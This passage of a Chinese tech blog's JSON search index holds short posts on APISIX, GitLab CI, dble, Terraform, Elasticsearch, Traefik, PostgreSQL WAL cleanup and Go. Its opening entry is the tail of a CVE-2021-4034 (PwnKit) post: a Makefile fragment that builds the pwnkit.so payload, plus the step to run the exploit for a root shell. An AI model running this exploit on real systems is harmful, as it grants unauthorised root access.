PWNKIT// pwnkit 1\" \u003e $@ .PHONY: gconvpath gconvpath: mkdir -p GCONV_PATH=. cp -f $(TRUE) GCONV_PATH=./pwnkit.so:. pwnkit.so: pwnkit.c $(CC) $(CFLAGS) --shared -fPIC -o $@ $\u003c .PHONY: dry-run dry-run: make -C dry-run ","date":"2022-06-17 14:40","objectID":"/post/2844/:0:1","tags":[],"title":"CVE-2021-4034 普通用户提权ROOT SHELL漏洞","uri":"/post/2844/"},{"categories":["其他"],"content":"执行make编译,执行./cve-2021-4034提权","date":"2022-06-17 14:40","objectID":"/post/2844/:0:2","tags":[],"title":"CVE-2021-4034 普通用户提权ROOT SHELL漏洞","uri":"/post/2844/"},{"categories":["云原生"],"content":"准备 git clone https://github.com/apache/apisix-docker.git cd apisix-docker/example ","date":"2022-05-31 01:00","objectID":"/post/2840/:0:1","tags":["lua","openresty","apisix"],"title":"Apisix lua插件开发流程(docker-compose部署)","uri":"/post/2840/"},{"categories":["云原生"],"content":"一、开启control api vim apisix_conf/config.yaml enable_control: true control: ip: \"127.0.0.1\" port: 9090 ","date":"2022-05-31 01:00","objectID":"/post/2840/:0:2","tags":["lua","openresty","apisix"],"title":"Apisix lua插件开发流程(docker-compose部署)","uri":"/post/2840/"},{"categories":["云原生"],"content":"二、启动apisix docker-compose -p docker-apisix up -d ","date":"2022-05-31 01:00","objectID":"/post/2840/:0:3","tags":["lua","openresty","apisix"],"title":"Apisix lua插件开发流程(docker-compose部署)","uri":"/post/2840/"},{"categories":["云原生"],"content":"三、新增插件脚本 # 进入容器编辑文件 docker exec -it docker-apisix_apisix_1 vim /usr/local/apisix/apisix/plugins/my-plugin.lua 脚本内容 local plugin_name = \"my-plugin\" local schema = { type = \"object\", properties = { content = { type = \"string\" } } } local _M = { version = 0.2, priority = 5001, name = plugin_name, schema = schema, } return _M 将自定义的插件放到配置文件中。 vim /usr/local/apisix/conf/config-default.yaml plugins: - my-plugin ","date":"2022-05-31 01:00","objectID":"/post/2840/:0:4","tags":["lua","openresty","apisix"],"title":"Apisix lua插件开发流程(docker-compose部署)","uri":"/post/2840/"},{"categories":["云原生"],"content":"四、配置dashboard可见 自定义插件后，需更新apisix dashboard的schema.json # 重启apisix(不重启不知道行不行,待测试) docker restart docker-apisix_apisix_1 # 导出schema.json docker exec -it docker-apisix_apisix_1 curl 127.0.0.1:9090/v1/schema \u003e schema.json # 将schema.json复制到dashboard容器中 docker cp schema.json docker-apisix_apisix-dashboard_1:/usr/local/apisix-dashboard/conf/ # 重启dashboard docker restart docker-apisix_apisix-dashboard_1 效果: 54733-jb4zvaxvwl.png ","date":"2022-05-31 01:00","objectID":"/post/2840/:0:5","tags":["lua","openresty","apisix"],"title":"Apisix lua插件开发流程(docker-compose部署)","uri":"/post/2840/"},{"categories":["系统服务","docker","云原生"],"content":"问题描述: 当提交代码触发gitlab pipeline时，执行到build阶段的docker push时，提示 denied: access forbidden，前面也提示登录成功了，很奇怪，最近并没有修改gitlab-ci文件，之前运行也一直没问题，并且其他pipeline还可以正常运行，所以只能从ci配置上找问题了。 ci配置大致如下: image: registry.gitlab.xxx.cn/base-images/maven variables: IMAGE_REF: $CI_REGISTRY_IMAGE:$CI_PIPELINE_ID stages: - build build: stage: build script: - export MAVEN_OPTS=-Dmaven.repo.local=$PWD/.m2/repository - mvn $MAVEN_CLI_OPTS clean package - mvn -U package - docker login -u gitlab-ci-token -p $CI_BUILD_TOKEN $ - docker build -t $IMAGE_REF . - docker push $IMAGE_REF - docker rmi $IMAGE_REF cache: paths: - .m2 可以看到build是使用了一个公共的基础镜像，执行的内容就是编译打包制作镜像上传 ","date":"2022-05-12 18:45","objectID":"/post/2833/:0:1","tags":["devops"],"title":"gitlab-ci 上传镜像提示denied: access forbidden","uri":"/post/2833/"},{"categories":["系统服务","docker","云原生"],"content":"排查 略 ","date":"2022-05-12 18:45","objectID":"/post/2833/:0:2","tags":["devops"],"title":"gitlab-ci 上传镜像提示denied: access forbidden","uri":"/post/2833/"},{"categories":["系统服务","docker","云原生"],"content":"原因 问题比较坑，很久之前因为某些原因(忘记了)升级了runner所在宿主机的docker版本到20.10.12，之前应该是1.13。但是基础镜像中使用的docker客户端版本还是1.13的，所以就导致哪怕提示登陆成功，但是依然不能上传镜像。 ","date":"2022-05-12 18:45","objectID":"/post/2833/:0:3","tags":["devops"],"title":"gitlab-ci 上传镜像提示denied: access forbidden","uri":"/post/2833/"},{"categories":["系统服务","docker","云原生"],"content":"解决 方法一、 将maven和docker剥离开,docker使用新的stage，并且单独使用新版本的docker客户端image,这样的好处就是不用修改基础镜像了。 方法二、 升级基础镜像中的docker版本","date":"2022-05-12 18:45","objectID":"/post/2833/:0:4","tags":["devops"],"title":"gitlab-ci 上传镜像提示denied: access forbidden","uri":"/post/2833/"},{"categories":["databases"],"content":"官方文档: https://actiontech.github.io/dble-docs-cn ","date":"2022-05-04 22:12","objectID":"/post/2829/:0:0","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"拆分类型 ","date":"2022-05-04 22:12","objectID":"/post/2829/:1:0","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"垂直拆分 不同的表放到不同的库中 table_a -\u003e mysql1 table_b -\u003e mysql2 table_c -\u003e mysql3 ","date":"2022-05-04 22:12","objectID":"/post/2829/:1:1","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"水平拆分 相同的表放到不同的库中,但需要明确拆分规则，比如按照id大小拆分到不同的库中。 table_a -\u003e mysql1 table_a -\u003e mysql2 table_a -\u003e mysql3 ","date":"2022-05-04 22:12","objectID":"/post/2829/:1:2","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"dble执行架构 Application -\u003e dble接收请求 -\u003e 简单查询 -\u003e 直接查询返回结果 | 复杂查询 | 执行查询 | 代码层处理join、group、order等操作 | 返回结果 ","date":"2022-05-04 22:12","objectID":"/post/2829/:2:0","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"重新加载配置 restart reload: 重新获取分片以及用户权限两个部分 reload all: 在reload的基础上重启获取mysql连接信息并重建连接池。比较常用 ","date":"2022-05-04 22:12","objectID":"/post/2829/:2:1","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"分片表类型 ","date":"2022-05-04 22:12","objectID":"/post/2829/:3:0","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"分片表 数据根据水平拆分的表。比如ad表数据量太大，需要分到不同的mysql节点中。 ","date":"2022-05-04 22:12","objectID":"/post/2829/:3:1","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"分片子表 附属于某分片表的子表，和父表以同样的规则进行水平拆分的表。 比如: customer(分片表) 按照id分片，均匀的分配到每个mysql节点上 order(分片子表) 包含customer id，为了业务方便，期望用户和订单都存在同一个节点中, 比如id=1的用户的数据分配到mysql2中，那么与他相关联的订单数据也要分配到mysql2中 ","date":"2022-05-04 22:12","objectID":"/post/2829/:3:2","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"全局表 在每个mysql节点中都拥有一份全量的数据，比如字典数据可以用到全局表。 ","date":"2022-05-04 22:12","objectID":"/post/2829/:3:3","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"非分片表 不分片，垂直分片表，只在其中一个mysql节点中存储，比如日志表 ","date":"2022-05-04 22:12","objectID":"/post/2829/:3:4","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"如何分片 ","date":"2022-05-04 22:12","objectID":"/post/2829/:4:0","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"schema.xml 定义具体的table要存放到哪个mysql节点中的哪个database中，包括mysql连接信息，用户、密码、ip、端口以及存放数据的database。 ** 配置语法格式 ** schema部分 \u003cschema name=\"TESTDB\"\u003e \u003c!-- 虚拟库名称 --\u003e \u003c!-- 定义的是分片表类型。分别对应表名，分片表可以存到哪些节点、分片规则名称 --\u003e \u003ctable name=\"travelrecord\" dataNode=\"dn1,dn2\" rule=\"sharding-by-hash2\" /\u003e \u003c!-- 定义的是全局表类型。分别对应表名、主键列、类型是全局表、全局表可以存到哪些节点、自增属性--\u003e \u003ctable name=\"company\" primaryKey=\"ID\" type=\"global\" dataNode=\"dn1,dn2,dn3,dn4\" autoIncrement=\"true\" /\u003e \u003c!-- 定义分片子表,外面和分片表一样 --\u003e \u003ctable name=\"customer\" primaryKey=\"ID\" dataNode=\"dn1,dn2\" rule=\"sharding-by-mod\"\u003e \u003c!-- 定义分片子表类型,分别对应表名、主键列、子表中的id、父表中的id --\u003e \u003cchildTable name=\"orders\" primaryKey=\"ID\" joinKey=\"customer_id\" parentKey=\"id\" /\u003e \u003c!-- 找到父表中id列等于子表中的customer_id列的记录，被分片到哪个节点中。子表的数据也会被分配到和父表同一个节点中 --\u003e \u003c/table\u003e \u003c!-- 非分片表类型 --\u003e \u003ctable name=\"logs\" dataNode=\"dn2\" /\u003e \u003c/schema\u003e ** dataNode、dataHost部分 ** \u003c!-- 定义mysql节点名称、mysql的连接信息(dataHost)、mysql的database --\u003e \u003cdataNode name=\"dn1\" dataHost=\"dh1\" database=\"db1\" /\u003e \u003cdataNode name=\"dn2\" dataHost=\"dh1\" database=\"db2\" /\u003e \u003c!-- 定义数据库连接信息名称 --\u003e \u003cdataHost name=\"dh1\" maxCon=\"1000\" minCon=\"10\" balance=\"0\" switchType=\"-1\" slaveThreshold=\"100\"\u003e \u003c!-- dble用来检测数据库是否可以连接的sql命令 --\u003e \u003cheartbeat\u003eshow slave status\u003c/heartbeat\u003e \u003c!-- 后端mysql的具体连接信息,支持读写分离 --\u003e \u003cwriteHost host=\"hostM1\" url=\"127.0.0.1:3306\" user=\"root\" password=\"123456\" \u003e \u003creadHost host=\"hostS1\" url=\"127.0.0.1:3307\" user=\"root\" password=\"1234567\" \u003e \u003c/writeHost\u003e \u003c/dataHost\u003e 参数具体含义: https://actiontech.github.io/dble-docs-cn/history/2.19.03.0/1.config_file/1.02_schema.xml.html ","date":"2022-05-04 22:12","objectID":"/post/2829/:4:1","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"rule.xml 分片具体使用的规则、分片数量、分片细节 配置语法格式: \u003ctableRule name=\"id-enum\"\u003e \u003c!-- 分片规则名称 --\u003e \u003crule\u003e \u003ccolumns\u003eid\u003c/columns\u003e \u003c!-- 分片列 --\u003e \u003calgorithm\u003eenum\u003c/algorithm\u003e \u003c!-- 指定分片方法名,对应下面的function名称 --\u003e \u003c/rule\u003e \u003c/tableRule\u003e \u003cfunction name=\"enum\" class=\"Enum\"\u003e \u003c!-- 分片方法名和类名(类名只能是Enum,NumberRange,Hash,StringHash,Date,PatternRange,jumpStringHash) --\u003e \u003cproperty name=\"mapFile\"\u003epartition-hash-int.txt\u003c/property\u003e \u003cproperty name=\"defaultNode\"\u003e0\u003c/property\u003e \u003cproperty name=\"type\"\u003e0\u003c/property\u003e \u003c/function\u003e function可以写一个分片细节，tableRule用来引用这个分片细节。 比如coustomer要按照id分片，order要按照cid来分片。他们的分片逻辑是一样的，那么他们可以指向同一个function。 ","date":"2022-05-04 22:12","objectID":"/post/2829/:4:2","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"wrapper.conf jvm配置相关 ","date":"2022-05-04 22:12","objectID":"/post/2829/:4:3","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["databases"],"content":"myid.properites dble集群配置,暂未了解 ","date":"2022-05-04 22:12","objectID":"/post/2829/:4:4","tags":["mysql","dble"],"title":"dble学习-基本配置和概念(一)","uri":"/post/2829/"},{"categories":["基础内容"],"content":" #!/bin/bash function init(){ [ -e fd1 ] || mkfifo fd1 exec 5\u003c\u003efd1 rm -f fd1 NUM=${1:-10} for (( i=1;i\u003c=${NUM};i++ )) do echo \u003e\u00265 done } function start(){ while true; do [ -f lock ] \u0026\u0026 break read -u5 { #script body echo \u003e\u00265 } \u0026 sleep ${1:-0} done wait } # 初始化,指定进程数 init $1 # 开始执行,如果要加执行间隔可以指定 start $2 ","date":"2022-04-28 22:52","objectID":"/post/2827/:0:0","tags":["linux","shell"],"title":"shell脚本实现多进程","uri":"/post/2827/"},{"categories":["java"],"content":"使用maven编译的时候报错Exception in thread \"main\" java.lang.AssertionError，需要添加一个编译插件显示详细的错误信息 \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.apache.maven.plugins\u003c/groupId\u003e \u003cartifactId\u003emaven-compiler-plugin\u003c/artifactId\u003e \u003cversion\u003e3.8.1\u003c/version\u003e \u003cconfiguration\u003e \u003cforceJavacCompilerUse\u003etrue\u003c/forceJavacCompilerUse\u003e \u003c/configuration\u003e \u003c/plugin\u003e ","date":"2022-04-26 20:46","objectID":"/post/2826/:0:0","tags":["java","maven"],"title":"java Exception in thread \u0026quot;main\u0026quot; java.lang.AssertionError","uri":"/post/2826/"},{"categories":["云原生","terraform"],"content":"Providers: 提供与不同云厂商的交互 支持的Providers: https://registry.terraform.io/browse/providers ","date":"2022-04-23 04:02","objectID":"/post/2818/:0:0","tags":["terraform"],"title":"terraform学习(一)","uri":"/post/2818/"},{"categories":["云原生","terraform"],"content":"初体验 目录结构如下 03887-ldcedko4p3.png ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:0","tags":["terraform"],"title":"terraform学习(一)","uri":"/post/2818/"},{"categories":["云原生","terraform"],"content":"一、声明Provider 这里以阿里云为例 # file: versions.tf terraform { # 指定terraform的版本号 required_version = \"1.1.9\" # 声明我们要用的peovider列表,这里的内容可以通过官方文档获取 required_providers { alicloud = { source = \"aliyun/alicloud\" version = \"1.164.0\" } } } required_version可以通过terraform version查看,注意版本号不带v ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:1","tags":["terraform"],"title":"terraform学习(一)","uri":"/post/2818/"},{"categories":["云原生","terraform"],"content":"二、配置Provider 上面我们声明了我们要使用阿里云,下面需要配置阿里云认证的相关参数 # file: main.tf provider \"alicloud\" { access_key = \"${var.ali_access_key}\" secret_key = \"${var.ali_secret_key}\" region = \"${var.ali_region}\" } 我们通过环境变量来读取所需要的信息,环境变量需要以TF_VAR_开头 例如: TF_VAR_ali_access_key=xxx、TF_VAR_ali_secret_key=xxx、TF_VAR_ali_region=xxx 声明变量类型 # variables.tf variable \"ali_access_key\" { type = string } variable \"ali_secret_key\" { type = string } variable \"ali_region\" { type = string } ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:2","tags":["terraform"],"title":"terraform学习(一)","uri":"/post/2818/"},{"categories":["云原生","terraform"],"content":"三、声明资源 这里指定我们要创建一个VPC网络,并且还会创建一个交换机 # file: ali_vpc.tf # 定义一个资源 # 格式 resource \"资源类型\" \"资源名称\" resource \"alicloud_vpc\" \"vpc\" { vpc_name = \"tf_test_foo\" cidr_block = \"172.16.0.0/12\" } # 交换机属于vpc,所以可以顺带创建了 resource \"alicloud_vswitch\" \"vsw\" { # 引用上面的vpc资源,通过`资源类型.资源名称.id`获取 vpc_id = alicloud_vpc.vpc.id vswitch_name = \"tf_test_foo-a\" cidr_block = \"172.16.0.0/24\" zone_id = \"cn-shanghai-a\" } ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:3","tags":["terraform"],"title":"terraform学习(一)","uri":"/post/2818/"},{"categories":["云原生","terraform"],"content":"四、初始化terraform cd tf-example terraform init init含义: Terraform 使用tf-example作为工作目录，并且还会创建.terraform目录来存储设置信息、缓存插件和模块，状态数据。 ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:4","tags":["terraform"],"title":"terraform学习(一)","uri":"/post/2818/"},{"categories":["云原生","terraform"],"content":"五、检查计划 检查计划用来检查我们的配置,并不会真正的创建资源 terraform plan 可以看到提示我们有两个新增 31336-y4hqq014v2.png ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:5","tags":["terraform"],"title":"terraform学习(一)","uri":"/post/2818/"},{"categories":["云原生","terraform"],"content":"六、创建资源 terraform apply 可以看到vpc和交换机都成功创建了 17300-s0bdlth6xec.png ","date":"2022-04-23 04:02","objectID":"/post/2818/:1:6","tags":["terraform"],"title":"terraform学习(一)","uri":"/post/2818/"},{"categories":["基础内容","databases"],"content":"1.禁用分片自动分配 PUT _cluster/settings { \"persistent\": { \"cluster.routing.allocation.enable\": \"none\" } } ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:1","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1小版本升级到5.5.3","uri":"/post/2814/"},{"categories":["基础内容","databases"],"content":"2.执行同步刷新 可以提升恢复速度https://www.kancloud.cn/apachecn/elasticsearch-doc-zh/1945139 POST _flush/synced ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:2","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1小版本升级到5.5.3","uri":"/post/2814/"},{"categories":["基础内容","databases"],"content":"3.关闭所有节点的es或者一台一台升级都可以 ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:3","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1小版本升级到5.5.3","uri":"/post/2814/"},{"categories":["基础内容","databases"],"content":"4.升级 wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.3.rpm rpm -U elasticsearch-5.5.3.rpm ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:4","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1小版本升级到5.5.3","uri":"/post/2814/"},{"categories":["基础内容","databases"],"content":"5.升级插件 - 如果需要的话 ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:5","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1小版本升级到5.5.3","uri":"/post/2814/"},{"categories":["基础内容","databases"],"content":"6.启动节点 如果配置了master和node，需要优先启动master systemctl start elasticsearch ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:6","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1小版本升级到5.5.3","uri":"/post/2814/"},{"categories":["基础内容","databases"],"content":"7.观察集群状态 可以看到集群处于黄色状态,这是因为副本分片没有被分配 GET _cat/health GET _cat/nodes ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:7","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1小版本升级到5.5.3","uri":"/post/2814/"},{"categories":["基础内容","databases"],"content":"8.重新启用分片自动分配 PUT _cluster/settings { \"persistent\": { \"cluster.routing.allocation.enable\": \"all\" } } ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:8","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1小版本升级到5.5.3","uri":"/post/2814/"},{"categories":["基础内容","databases"],"content":"9.等待恢复完成 # 查看集群健康状态 GET _cat/health # 查看恢复进度 GET _cat/recovery ","date":"2022-04-22 12:42","objectID":"/post/2814/:0:9","tags":["elasticsearch"],"title":"ElasticSearch 5.5.1小版本升级到5.5.3","uri":"/post/2814/"},{"categories":["系统服务","databases"],"content":"安装插件 插件官方文档 ","date":"2022-04-22 10:10","objectID":"/post/2813/:1:0","tags":["elasticsearch"],"title":"Elasticsearch快照到阿里云OSS","uri":"/post/2813/"},{"categories":["系统服务","databases"],"content":"一、准备工作 一个oss bucket 阿里云的access_key_id,secret_access_key 一个es5.x的集群 ","date":"2022-04-22 10:10","objectID":"/post/2813/:1:1","tags":["elasticsearch"],"title":"Elasticsearch快照到阿里云OSS","uri":"/post/2813/"},{"categories":["系统服务","databases"],"content":"二、安装elasticsearch-repository-oss插件 下载插件 wget https://github.91chi.fun/https://github.com/aliyun/elasticsearch-repository-oss/releases/download/v5.5.3/elasticsearch-repository-oss-5.5.3.zip ansible-playbook批量安装插件 - hosts: es vars: plugin_dir: /usr/share/elasticsearch/plugins plugin_file: ./elasticsearch-repository-oss-5.5.3.zip tasks: - name: install aliyun-oss-plugin unarchive: src: \"{{ plugin_file }}\" dest: \"{{ plugin_dir }}\" mode: 0755 - name: alter directory name shell: \"mv {{plugin_dir}}/elasticsearch {{plugin_dir}}/elasticsearch-repository-oss\" # 重启请谨慎 #- name: restart elasticsearch # service: name=elasticsearch state=restarted ","date":"2022-04-22 10:10","objectID":"/post/2813/:1:2","tags":["elasticsearch"],"title":"Elasticsearch快照到阿里云OSS","uri":"/post/2813/"},{"categories":["系统服务","databases"],"content":"三、创建repositories repoName: 仓库名称 yourAccesskeyId: 阿里ak yourAccesskeySecret: 阿里sk yourBucketName: bucket名称 endpoint: 根据自己bucket的情况修改 base_path: 对应oss中的子路径 curl -H \"Content-Type: application/json\" -XPUT localhost:9200/_snapshot/\u003crepoName\u003e -d \\ '{ \"type\": \"oss\", \"settings\": { \"endpoint\": \"http://oss-cn-hangzhou-internal.aliyuncs.com\", \"access_key_id\": \"\u003cyourAccesskeyId\u003e\", \"secret_access_key\": \"\u003cyourAccesskeySecret\u003e\", \"bucket\": \"\u003cyourBucketName\u003e\", \"compress\": true, \"base_path\": \"snapshot/\" } }' 查看仓库 curl http://localhost:9200/_cat/repositories ","date":"2022-04-22 10:10","objectID":"/post/2813/:1:3","tags":["elasticsearch"],"title":"Elasticsearch快照到阿里云OSS","uri":"/post/2813/"},{"categories":["系统服务","databases"],"content":"四、创建snapshot snapshotName: 快照名 curl -H \"Content-Type: application/json\" -XPUT localhost:9200/_snapshot/\u003crepoName\u003e/\u003csnapshotName\u003e?pretty -d' { \"indices\": \"index1,index2\" }' 如果要备份所有索引执行: curl -XPUT localhost:9200/_snapshot/\u003crepoName\u003e/\u003csnapshotName\u003e 查看快照进度: curl -s http://localhost:9200/_snapshot/\u003crepoName\u003e/_all ","date":"2022-04-22 10:10","objectID":"/post/2813/:1:4","tags":["elasticsearch"],"title":"Elasticsearch快照到阿里云OSS","uri":"/post/2813/"},{"categories":["系统服务","databases"],"content":"恢复快照 ","date":"2022-04-22 10:10","objectID":"/post/2813/:2:0","tags":["elasticsearch"],"title":"Elasticsearch快照到阿里云OSS","uri":"/post/2813/"},{"categories":["系统服务","databases"],"content":"一、三种恢复索引的方式 1.恢复所有索引 curl -XPOST localhost:9200/_snapshot/\u003crepoName\u003e/\u003csnapshotName\u003e/_restore # 默认后台执行恢复,阻塞执行恢复可以使用 curl -XPOST localhost:9200/_snapshot/\u003crepoName\u003e/\u003csnapshotName\u003e/_restore?wait_for_completion=true 2.选择性索引恢复 *代表恢复所有索引 -xxx*代表不恢复哪些索引 curl -XPOST localhost:9200/_snapshot/\u003crepoName\u003e/\u003csnapshotName\u003e/_restore {\"indices\":\"*,-.monitoring*,-.security_audit*\",\"ignore_unavailable\":\"true\"} 3.修改索引名恢复 如果集群中已经存在相同索引名的索引,为了不影响现有数据,可以通过如下方式重命名索引。 这里应该也可以在索引恢复过程中,修改索引名称, curl -XPOST localhost:9200/_snapshot/\u003crepoName\u003e/\u003csnapshotName\u003e/_restore { \"indices\":\"index1\", \"rename_pattern\": \"index(.+)\", \"rename_replacement\": \"restored_index_$1\" } indices: 要恢复的索引名称 rename_pattern: 通过正则查找正在恢复的索引 rename_replacement: 重命名查找到的索引 ","date":"2022-04-22 10:10","objectID":"/post/2813/:2:1","tags":["elasticsearch"],"title":"Elasticsearch快照到阿里云OSS","uri":"/post/2813/"},{"categories":["系统服务","databases"],"content":"二、查看恢复进度 # 查看指定索引的恢复状态 curl -XGET localhost:9200/\u003cindexName\u003e/_recovery # 查看所有索引的恢复状态 curl -XGET localhost:9200/_recovery/ ","date":"2022-04-22 10:10","objectID":"/post/2813/:2:2","tags":["elasticsearch"],"title":"Elasticsearch快照到阿里云OSS","uri":"/post/2813/"},{"categories":["kubernetes","云原生"],"content":"1.这里用到traefik的middleware,用于添加响应头 apiVersion: traefik.containo.us/v1alpha1 kind: Middleware metadata: name: test-cors namespace: default spec: headers: customResponseHeaders: Access-Control-Allow-Origin: \"http://soulchild.cn:8080\" Access-Control-Allow-Methods: \"*\" Access-Control-Allow-Headers: \"*\" # 另一种写法 #accessControlAllowMethods: # - \"*\" #accessControlAllowOriginList: # - \"http://soulchild.cn:8080\" #accessControlAllowHeaders: # - \"*\" #accessControlMaxAge: 100 #addVaryHeader: true ","date":"2022-04-15 21:47","objectID":"/post/2810/:0:1","tags":["k8s","traefik"],"title":"traefik配置跨域策略","uri":"/post/2810/"},{"categories":["kubernetes","云原生"],"content":"2.和路由关联 这里说两种,一种是ingress资源，另一种是ingressroute 在ingress中添加annotations就可以关联了 traefik.ingress.kubernetes.io/router.middlewares: default-test-cors@kubernetescrd 如果使用的是ingressroute spec: entryPoints: - web routes: - kind: Rule match: PathPrefix(`/api/xxx`) middlewares: - name: test-cors namespace: default ","date":"2022-04-15 21:47","objectID":"/post/2810/:0:2","tags":["k8s","traefik"],"title":"traefik配置跨域策略","uri":"/post/2810/"},{"categories":["java"],"content":"和是同级的,这样设置的好处就是在构建容器镜像的时候，所有项目可以统一使用一样的名称。 \u003cbuild\u003e \u003cplugins\u003e \u003cplugin\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-maven-plugin\u003c/artifactId\u003e \u003cconfiguration\u003e \u003cfork\u003etrue\u003c/fork\u003e \u003c!--\u003ejar包名称\u003c--\u003e \u003cfinalName\u003eapp\u003c/finalName\u003e \u003c!--\u003e启动类全路径\u003c--\u003e \u003cmainClass\u003ecom.xxx.xx.xx.xx.xx.xxApplication\u003c/mainClass\u003e \u003c/configuration\u003e \u003cexecutions\u003e \u003cexecution\u003e \u003cgoals\u003e \u003cgoal\u003erepackage\u003c/goal\u003e \u003c/goals\u003e \u003c/execution\u003e \u003c/executions\u003e \u003c/plugin\u003e \u003c/plugins\u003e \u003c/build\u003e ","date":"2022-04-15 21:39","objectID":"/post/2809/:0:0","tags":["maven"],"title":"maven编译设置jar包的名称","uri":"/post/2809/"},{"categories":["其他"],"content":"打开开发者工具F12 var xhr = new XMLHttpRequest();xhr.open('GET', 'https://soulchild.cn');xhr.send(null); ","date":"2022-04-15 21:18","objectID":"/post/2808/:0:0","tags":[],"title":"跨域快速测试","uri":"/post/2808/"},{"categories":["kubernetes"],"content":"备忘 k get deploy -o template --template='{{range .items}}{{.metadata.name}}--replicas:{{.spec.replicas}}--{{range .spec.template.spec.containers}}cpu:{{.resources.limits.cpu}},mem:{{.resources.limits.memory}}{{end}}{{printf \"\\n\"}}{{end}}' 使用index处理引号问题 k get ingress -A -o template --template='{{range .items}}{{.metadata.name}}--class:{{ index .metadata.annotations \"kubernetes.io/ingress.class\"}}{{printf \"\\n\"}}{{end}}' ","date":"2022-04-06 11:40","objectID":"/post/2807/:0:0","tags":["k8s"],"title":"k8s kubectl 自定义输出template","uri":"/post/2807/"},{"categories":["databases"],"content":"介绍 pg_xlog 这个日志是记录的Postgresql的WAL信息，也就是一些事务日志信息(transaction log)，默认单个大小是16M，源码安装的时候可以更改其大小。这些信息通常名字是类似'000000010000000000000013’这样的文件，这些日志会在定时回滚恢复(PITR)，流复制(Replication Stream)以及归档时能被用到，这些日志是非常重要的，记录着数据库发生的各种事务信息，不得随意删除或者移动这类日志文件，不然你的数据库会有无法恢复的风险 当你的归档或者流复制发生异常的时候，事务日志会不断地生成，有可能会造成你的磁盘空间被塞满，最终导致DB挂掉或者起不来。遇到这种情况不用慌，可以先关闭归档或者流复制功能，备份pg_xlog日志到其他地方，但请不要删除。然后删除较早时间的的pg_xlog，有一定空间后再试着启动Postgres。 checkpoint(参考) https://www.phpyuan.com/article/128760.html http://blog.itpub.net/29990276/viewspace-2654054/ 清理日志(参考) https://blog.csdn.net/dazuiba008/article/details/100659749 ","date":"2022-03-03 15:04","objectID":"/post/2802/:0:1","tags":["postgresql","pgsql"],"title":"pg_xlog过大清理","uri":"/post/2802/"},{"categories":["databases"],"content":"清理步骤 echo 'checkpoint' | psql -Upostgres pg_controldata /data/postgresql # 主要看下面这两个值 Latest checkpoint location: 1C81/69444018 Prior checkpoint location: 1C81/69443F58 Latest checkpoint's REDO location: 1C81/69443FC8 Latest checkpoint's REDO WAL file: 0000000500001C8100000069 # 清理0000000500001C8100000069之后的日志文件 pg_archivecleanup /data/postgresql/pg_xlog/ 0000000500001C8100000069 ","date":"2022-03-03 15:04","objectID":"/post/2802/:0:2","tags":["postgresql","pgsql"],"title":"pg_xlog过大清理","uri":"/post/2802/"},{"categories":["golang"],"content":"有符号整数型 类型 占用内存 数值范围 int 32位系统-4byte 64位系统-8byte -2147483648~2147483647 -9223372036854775808~9223372036854775807 int8 1byte -128~127 int16 2byte -32768~32767 int32｜rune 4byte -2147483648~2147483647 int64 8byte -9223372036854775808~9223372036854775807 ","date":"2022-02-27 18:39","objectID":"/post/2798/:0:1","tags":["golang","go"],"title":"golang数据类型","uri":"/post/2798/"},{"categories":["golang"],"content":"无符号整数型 类型 占用内存 数值范围 uint 32位系统-4byte 64位系统-8byte 0~4294967295 0~18446744073709551615 uint8｜byte 1byte 0~255 uint16 2byte 0~65535 uint32 4byte 0~4294967295 uint64 8byte 0~18446744073709551615 ","date":"2022-02-27 18:39","objectID":"/post/2798/:0:2","tags":["golang","go"],"title":"golang数据类型","uri":"/post/2798/"},{"categories":["golang"],"content":"浮点类型 类型 占用内存 数值范围 float32 4byte 